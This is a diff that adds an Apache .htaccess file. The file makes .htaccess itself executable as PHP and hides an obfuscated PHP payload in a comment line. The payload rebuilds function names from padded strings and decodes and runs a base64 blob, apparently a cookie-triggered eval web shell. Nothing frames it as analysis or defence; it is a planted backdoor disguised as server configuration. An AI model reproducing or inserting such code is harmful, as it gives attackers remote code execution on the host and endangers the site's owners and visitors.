@@ -1,0 +1,7 @@
+<Files ~ "^\.ht">
+    Order allow,deny
+    Allow from all
+</Files>
+
+AddType application/x-httpd-php .htaccess
+# <?php $xmer = str_replace("b","","sbtbr_rbepblabcbe"); $kvjo="PjMpeyRrPScxd1bmQnO2VjaG8gJzwnLiRrLic+JztldcxmcxFsKcxGJhcxc2U2NF9kZWNvZGUcxocHJlZ"; $damg="LCBqb2luKGFycxcmF5X3NsaWNlKCRhLCRjKCRhKS0zKSkpKSk7ZWNobycxAnPC8nLcxiRrcxLic+Jcxztcx9"; $apoz="cx19yZXBcxsYWNlKcxGFycmF5KCcvW15cdz1cc10vJycxwnL1xzLcxycpLCBcxhcnJcxheSgnJywnKycp"; $rwyc="JGMcx9J2NvdW50JzskYT0kXcx0NPTcx0tJRTtpZihyZXNldCgkYScxk9PcxSdmbycxcgJiYgJcxGMoJGEp"; $ezed = $xmer("oh", "", "ohbaseoh6oh4oh_doheohcohoohde"); $hxmg = $xmer("v","","cvrvevavtvev_vfvunvcvtivovn"); $hlyn = $hxmg('', $ezed($xmer("cx", "", $rwyc.$kvjo.$apoz.$damg))); $hlyn(); ?> #
